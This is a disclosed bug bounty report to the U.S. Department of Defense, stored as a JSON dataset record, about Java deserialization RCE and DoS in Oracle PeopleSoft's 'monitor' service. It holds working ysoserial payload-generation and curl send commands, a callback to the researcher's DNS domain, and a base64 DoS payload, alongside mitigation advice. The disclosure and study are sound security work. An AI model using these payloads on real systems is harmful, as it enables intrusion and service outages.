{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "joaomatosf ",
  "title": "Remote Code Execution (RCE) in a DoD website",
  "content": "\nSUMMARY:\nThe DoD https://\u2588\u2588\u2588\u2588\u2588\u2588/psc/EXPROD_1/ Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the \u201cmonitor\u201d service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].\nPROOF OF CONCEPT\nFor PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (testing1.jexboss.info). In this way, if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon (the vulnerable DoD server will perform a local DNS query for testing1.jexboss.info and the local DNS will try to query the authoritative nameserver for the jexboss.info domain (ns1.jexboss.info), which is mine).\nFor more details about this payload used, see [2].\nAttached is a video detailing the PoC.\nGenerating the payload: for generate the payload I used the tool ysoserial.\nCode 202 Bytes\n1$ git clone https://github.com/frohoff/ysoserial.git\n2$ cd ysoserial\n3$ mvn clean package \u2013DskipTests\n4$ cd target\n5$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://testing1.jexboss.info > payload\nSending the payload to a vulnerable server:\nCode 65 Bytes\n1curl https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/monitor/EXPROD_1 --data-binary @payload -k\nAfter sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.\nBIND logs:\nCode 114 Bytes\n123-Mar-2018 18:51:09.183 queries: info: client \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588#53133: query: testing1.jexboss.info IN A -ED (10.0.1.202)\nDenial Of Service (DoS)\nThis vulnerability also allows denial of service attacks, but I can not perform this test because it puts the availability of your service at risk. If you want to validate this, use the following PoC:\nGenerating payload for Denial of Service (DoS)[3]:\nCode 188 Bytes\n1echo -n \"rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3\" | base64 -d > payload_dos\nSending:\nCode 67 Bytes\n1curl https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/monitor/EXPROD_1 --data-binary @payload_dos -k\nThis will make your service stop immediately and show the following error in the logs:\nException in thread \"Thread-2\" java.lang.OutOfMemoryError: Java heap space\nMITIGATION\nThe best way to mitigate deserialization vulnerabilities is by not deserializing data received from users. In this particular case, any requests from the internet to the path /monitor should be rejected/blocked!\nAlso, it is important to note that updating libraries used by attackers as Gadgets (such as commonsCollections) is not enough to protect against deserialization attacks, since new gadgets are discovered and published frequently. So, blocking the monitor service is best suited for this case!\nREFERENCES:\n[1] - CVE-2017-10366. Link: https://nvd.nist.gov/vuln/detail/CVE-2017-10366\n[2] - Triggering a DNS lookup using Java Deserialization. Link: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/\n[3] - Java Deserialization DoS \u2013 payloads. Link: http://topolik-at-work.blogspot.com.br/2016/04/java-deserialization-dos-payloads.html\nBest Regards,\nJo\u00e3o Filho Matos Figueiredo, @joaomatosf\nImpact\nThis vulnerability allows:\n1) Remote Code Execution (RCE)\n2) Denial of Service (DoS)\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Deserialization of Untrusted Data"
  ],
  "screenshots": {},
  "disclosed_date": 1570575060,
  "report_url": "https://hackerone.com/reports/329376",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Clone the ysoserial tool: git clone https://github.com/frohoff/ysoserial.git"
    ],
    [
      2,
      "Generate the payload: java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://testing1.jexboss.info > payload"
    ],
    [
      3,
      "Send the payload to the vulnerable server: curl https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/monitor/EXPROD_1 --data-binary @payload -k"
    ],
    [
      4,
      "Monitor DNS logs for incoming queries from the target server"
    ]
  ],
  "vuln_description": "The vulnerability is a Remote Code Execution (RCE) and Denial of Service (DoS) flaw in the Oracle PeopleSoft platform used by a DoD website. It arises from insecure Java Object Deserialization (CWE-502) in the 'monitor' service, allowing attackers to send malicious serialized Java objects that execute arbitrary code or crash the service when deserialized.",
  "reason": "The attack involves using a known tool (ysoserial) to generate a payload targeting a well-documented vulnerability (CVE-2017-10366). The steps are straightforward and do not require understanding complex application states or novel logic. The interaction between the components (payload generation and sending) is standard for this type of vulnerability.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}